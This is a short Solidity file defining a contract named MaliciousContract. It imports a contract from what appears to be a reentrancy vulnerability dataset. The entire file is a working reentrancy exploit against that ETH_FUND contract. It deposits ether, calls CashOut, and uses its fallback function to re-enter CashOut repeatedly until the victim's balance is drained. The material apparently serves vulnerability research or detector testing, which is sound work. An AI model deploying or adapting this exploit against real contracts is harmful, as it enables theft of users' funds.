pragma solidity ^0.4.19;
import "../dataset/reentrancy/0x941d225236464a25eb18076df7da6a91d0f95e9e.sol";

contract MaliciousContract {
    ETH_FUND eth_FUND;

    constructor(address _victimAddress) public {
        eth_FUND = ETH_FUND(_victimAddress);
    }

    function attack(uint256 amount) public {
        require(amount >= 1 ether, "Must send at least 1 ether");
        eth_FUND.CashOut(amount);
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        eth_FUND.Deposit.value(msg.value)();
    }

    function() public payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(eth_FUND).balance >= 1 ether) {
            eth_FUND.CashOut(1 ether);
        }
    }
}
